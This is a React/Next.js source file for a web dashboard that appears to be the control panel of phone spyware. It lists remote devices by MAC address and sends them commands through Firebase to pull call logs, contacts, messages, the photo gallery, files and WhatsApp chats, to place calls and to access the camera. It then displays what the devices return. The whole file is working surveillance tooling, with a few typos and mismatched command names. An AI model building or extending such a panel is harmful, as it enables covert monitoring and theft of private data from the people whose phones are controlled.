'use client'

import { useState, useEffect } from 'react'
import { initializeApp } from 'firebase/app'
import { getDatabase, ref,get, onValue, update } from 'firebase/database'

// Firebase configuration
const firebaseConfig = {
  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
  databaseURL: process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL,
  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID
}

// Initialize Firebase
const app = initializeApp(firebaseConfig)
const database = getDatabase(app)
const apiCalls = ['/call_logs', '/make_call','/get_contacts','/get_messages','/get_gallery','/get_file','/get_files','/access_camera','/get_whatsapp_chats',]

export default function Home() {
  const [formData, setFormData] = useState({
    macAddress: '',
    api_call: '',
    path: '',
    phoneNumber: '',
    messege: ''
  })
  const [results, setResults] = useState<any[]>([])
  const [devices, setDevices] = useState<String[]>([])
  const [pathVisibility,setPathVisibility] = useState(false)
  const [phoneNumberVisibility, setPhoneNumberVisibility] = useState(false)
  const [messegeVisibility, setMessegeVisibility] = useState(false)

const loadDevices = async () => {
  try {
    const dataRef = ref(database); // Reference to your Firebase Realtime Database
    const snapshot = await get(dataRef); // Perform a one-time read
    if (snapshot.exists()) {
      setDevices([])
      const mac = snapshot.val(); // Get the value of the data
      if (mac) {
        const keys = Object.keys(mac); // Extract keys (IDs) from the object
        setDevices((prevDevices) => [...prevDevices, ...keys]); // Update state with new devices
      }
    } else {
      console.log("No data available");
    }
  } catch (error) {
    console.error("Error fetching data:", error);
  }
};


  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target
    setFormData(prevData => ({ ...prevData, [name]: value }))
    if(name=='api_call'){
        setPhoneNumberVisibility(false)
        setPathVisibility(false)
        setMessegeVisibility(false)
      if(value=='/make_calls'|| value=='/get_messages'|| value=="/get_whatsapp_chats"){
        setPhoneNumberVisibility(true)
      }
      if(value=="/get_messeges" || value=="/get_whatsapp_chats"){
        setMessegeVisibility(true)
      }
      if(value=="/get_file"){
        setPathVisibility(true)
      }
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const dataRef = ref(database, formData.macAddress)
    await update(dataRef, formData)
    setFormData({macAddress:formData.macAddress, api_call: '', path: '', phoneNumber: '', messege: '' })
    onValue(dataRef, (snapshot) => {
      const mac = snapshot.val()
      if (mac) {
        const values = Object.values(mac) // Extract values from the object
        setResults((values as Array<{ [key: string]: string }>))
      }
    })
  }

  return (
    <div className="min-h-screen bg-gray-100 py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-3xl mx-auto">
        <h1 className="text-3xl font-bold text-center text-gray-900 mb-8">Firebase Realtime Database App</h1>
        
        <form onSubmit={handleSubmit} className="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4">
        <div className="mb-4">
            <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="macAddress">
              MAC address
            </label>
            <input
              className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
              id="macAddress"
              type="text"
              name="macAddress"
              value={formData.macAddress}
              onChange={handleInputChange}
              placeholder="Enter MAC Address"
            />
          </div>
          <div className="mb-4">
            <label
              className="block text-gray-700 text-sm font-bold mb-2"
              htmlFor="api_call"
            >
              API Call
            </label>
            <select
              className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
              id="api_call"
              name="api_call"
              value={formData.api_call}
              onChange={handleInputChange}
            >
              <option value="" disabled>
                Select API call
              </option>
              {apiCalls.map((item) => (
                <option key={item} value={item}>
                  {item}
                </option>
              ))}
            </select>
          </div>

          {pathVisibility?<div className="mb-4">
            <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="path">
              Path
            </label>
            <input
              className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
              id="path"
              type="text"
              name="path"
              value={formData.path}
              onChange={handleInputChange}
              placeholder="Enter path"
            />
          </div>:<div></div>}
          {phoneNumberVisibility?<div className="mb-4">
            <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="phoneNumber">
              Phone Number
            </label>
            <input
              className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
              id="phoneNumber"
              type="tel"
              name="phoneNumber"
              value={formData.phoneNumber}
              onChange={handleInputChange}
              placeholder="Enter phone number"
            />
          </div>:<div></div>}
          {messegeVisibility?<div className="mb-6">
            <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="message">
              Message
            </label>
            <textarea
              className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
              id="message"
              name="message"
              value={formData.messege}
              onChange={handleInputChange}
              placeholder="Enter message"
              rows={4}
            ></textarea>
          </div>:<div></div>}
          <div className="flex items-center justify-between">
            <button
              className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
              type="submit"
            >
              Send Data
            </button>
          </div>
        </form>
        <div className="bg-white shadow-md rounded px-8 pt-6 pb-8">
          <h2 className="text-2xl font-bold text-gray-900 mb-4">Results from Database</h2>
          { 
            <ul className="divide-y divide-gray-200" style={{ color: 'black' }}>
            {results.map((res, index) => (
              <li key={index}>{res}</li>
            ))}
          </ul>
          }
        </div>
        <div className="bg-white shadow-md rounded px-8 pt-6 pb-8">
          <h2 className="text-2xl font-bold text-gray-900 mb-4">Devices from Database</h2>
          <button
              className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
            onClick={loadDevices}>
              Load Devices
            </button>
          {devices.length > 0 ? (
            <ul className="divide-y divide-gray-200" style={{ color: 'black' }}>
            {devices.map((device, index) => (
              <li key={index}>{device}</li>
            ))}
          </ul>
          ) : (
            <p className="text-gray-500">No Devices available</p>
          )}
        </div>

      </div>
    </div>
  )
}

